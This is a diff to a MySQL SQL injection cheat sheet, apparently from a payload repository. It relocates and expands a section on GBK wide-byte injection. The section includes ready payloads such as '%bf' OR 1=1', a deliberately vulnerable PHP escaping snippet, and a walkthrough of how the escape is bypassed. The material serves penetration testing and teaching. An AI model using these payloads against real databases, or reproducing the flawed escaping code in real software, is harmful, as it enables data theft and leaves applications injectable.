@@ -22,7 +22,6 @@
     * [Using SLEEP in a subselect](#using-sleep-in-a-subselect)
     * [Using conditional statements](#using-conditional-statements)
 * [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
-* [MYSQL Wide byte injection](#mysql-wide-byte-injection)
 * [MYSQL Current queries](#mysql-current-queries)
 * [MYSQL Read content of a file](#mysql-read-content-of-a-file)
 * [MYSQL Write a shell](#mysql-write-a-shell)
@@ -39,6 +38,7 @@
     * [Alternative to version](#alternative-to-version)
     * [Scientific Notation](#scientific-notation)
     * [Conditional Comments](#conditional-comments)
+    * [Wide byte injection](#wide-byte-injection)
 * [References](#references)
 
 
@@ -440,35 +440,6 @@ make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(51
 ```
 
 
-## MYSQL Wide byte injection
-
-Wide byte injection works only when mysql encoding is set to gbk, a small php example: 
-
-```php
-function check_addslashes($string)
-{
-    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
-    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
-    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
-      
-    return $string;
-}
-
-$id=check_addslashes($_GET['id']);
-mysql_query("SET NAMES gbk");
-$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
-print_r(mysql_error());
-```
-
-PHP will check quote and add backslash, like translates `'` into `\'`.
-
-When input: `?id=1'` --> PHP add backslash --> `SELECT * FROM users WHERE id='1\'' LIMIT 0,1` --> not working.
-
-But if add `%df`: `?id=1%df'` --> PHP add backslash --> `SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1` --> ( `\` : `%5c`, `%df%5c` : `連` ) --> `SELECT * FROM users WHERE id='1連'' LIMIT 0,1` --> can escape `'`.
-
-So, it can be: `?id=1%df' and 1=1 --+` --> PHP add backslash-->  `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`, it can be inject.
-
-
 ## MYSQL Current queries
 
 This table can list all operations that DB is performing at the moment.
@@ -664,6 +635,55 @@ This technique can be used to obfuscate queries to bypass WAF, for example: `1.e
 Examples: `/*!12345UNION*/`, `/*!31337SELECT*/`
 
 
+### Wide byte injection
+
+Wide byte injection is a specific type of SQL injection attack that targets applications using multi-byte character sets, like GBK or SJIS. The term "wide byte" refers to character encodings where one character can be represented by more than one byte. This type of injection is particularly relevant when the application and the database interpret multi-byte sequences differently.
+
+The `SET NAMES gbk` query can be exploited in a charset-based SQL injection attack. When the character set is set to GBK, certain multibyte characters can be used to bypass the escaping mechanism and inject malicious SQL code.
+
+Several characters can be used to triger the injection.
+
+* `%bf%27`: This is a URL-encoded representation of the byte sequence `0xbf27`. In the GBK character set, `0xbf27` decodes to a valid multibyte character followed by a single quote ('). When MySQL encounters this sequence, it interprets it as a single valid GBK character followed by a single quote, effectively ending the string.
+* `%bf%5c`: Represents the byte sequence `0xbf5c`. In GBK, this decodes to a valid multi-byte character followed by a backslash (`\`). This can be used to escape the next character in the sequence.
+* `%a1%27`: Represents the byte sequence `0xa127`. In GBK, this decodes to a valid multi-byte character followed by a single quote (`'`).
+
+A lot of payloads can be created such as:
+
+```
+%A8%27 OR 1=1;--
+%8C%A8%27 OR 1=1--
+%bf' OR 1=1 -- --
+```
+
+Here is a PHP example using GBK encoding and filtering the user input to escape backslash, single and double quote.
+
+```php
+function check_addslashes($string)
+{
+    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
+    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
+    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
+      
+    return $string;
+}
+
+$id=check_addslashes($_GET['id']);
+mysql_query("SET NAMES gbk");
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+print_r(mysql_error());
+```
+
+Here's a breakdown of how the wide byte injection works:
+
+For instance, if the input is `?id=1'`, PHP will add a backslash, resulting in the SQL query: `SELECT * FROM users WHERE id='1\'' LIMIT 0,1`.
+
+However, when the sequence `%df` is introduced before the single quote, as in `?id=1%df'`, PHP still adds the backslash. This results in the SQL query: `SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1`. 
+
+In the GBK character set, the sequence `%df%5c` translates to the character `連`. So, the SQL query becomes: `SELECT * FROM users WHERE id='1連'' LIMIT 0,1`. Here, the wide byte character `連` effectively "eating" the added escape charactr, allowing for SQL injection.
+
+Therefore, by using the payload `?id=1%df' and 1=1 --+`, after PHP adds the backslash, the SQL query transforms into: `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`. This altered query can be successfully injected, bypassing the intended SQL logic.
+
+
 ## References
 
 - [MySQL Out of Band Hacking - @OsandaMalith](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
@@ -675,3 +695,4 @@ Examples: `/*!12345UNION*/`, `/*!31337SELECT*/`
 - [ekoparty web_100 - 2016/10/26 - p4-team](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)
 - [Websec - MySQL - Roberto Salgado - May 29, 2013.](https://websec.ca/kb/sql_injection#MySQL_Default_Databases)
 - [A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection - Marc Olivier Bergeron - Oct 19, 2021](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
+- [How to Use SQL Calls to Secure Your Web Site - IT SECURITY CENTER (ISEC) INFORMATION-TECHNOLOGY PROMOTION AGENCY](https://www.ipa.go.jp/security/vuln/ps6vr70000011hc4-att/000017321.pdf)
